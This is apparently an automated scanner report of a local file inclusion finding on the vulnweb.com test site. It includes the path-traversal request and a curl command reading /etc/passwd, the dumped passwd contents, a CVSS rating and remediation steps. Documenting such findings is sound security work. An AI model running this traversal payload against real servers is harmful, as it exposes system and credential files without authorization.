### Local File Inclusion - Linux (lfi-fuzzing-cba40f0f91bd1e73c7d927844b558ce2bf2830fa2f76c25c0b57cc2ff29c303e) found on testphp.vulnweb.com

----
**Details**: **lfi-fuzzing-cba40f0f91bd1e73c7d927844b558ce2bf2830fa2f76c25c0b57cc2ff29c303e** matched at testphp.vulnweb.com

**Protocol**: HTTP

**Full URL**: http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd

**Timestamp**: Thu Jun 12 23:21:52 +0800 WITA 2025

**Template Information**

| Key | Value |
| --- | --- |
| Name | Local File Inclusion - Linux |
| Authors | wahyuhadi |
| Tags | lfi, dast, linux |
| Severity | high |
| Description | Local File Inclusion (LFI) is a web security vulnerability that allows an attacker to include and execute files from the local server through user-controlled input. This can lead to unauthorized access to sensitive files, information disclosure, or even remote code execution (RCE) under certain conditions.<br> |
| tech | all |
| severtity | high (7.5) |
| cvss-3.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| cvss-3.1-link | https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

**Request**
```http
GET /showimage.php?file=../../etc/passwd HTTP/1.1
Host: testphp.vulnweb.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Priority: u=4, i
Referer: http://testphp.vulnweb.com/AJAX/index.php


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Content-Type: image/jpeg
Date: Thu, 12 Jun 2025 15:21:52 GMT
Server: nginx/1.19.0
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
nobody:x:65534:1002:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
bind:x:104:111::/var/cache/bind:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin



```
**Metadata:**

- path: ../../etc/passwd

**Fixing**

- Use Whitelisting, Allow only specific, predefined files.
- Block Directory Traversal,  Sanitize input to prevent ../ or null byte attacks.
- Use Least Privilege,  Restrict file permissions and avoid running as root.
- Monitor & Log Requests, Track suspicious activity and use a Web Application Firewall (WAF).



References: 
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

**CURL command**
```sh
curl -X 'GET' -d '' -H 'Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'Host: testphp.vulnweb.com' -H 'Priority: u=4, i' -H 'Referer: http://testphp.vulnweb.com/AJAX/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' 'http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd'
```


----

Eagle Pulsar Team :  > From Home With Love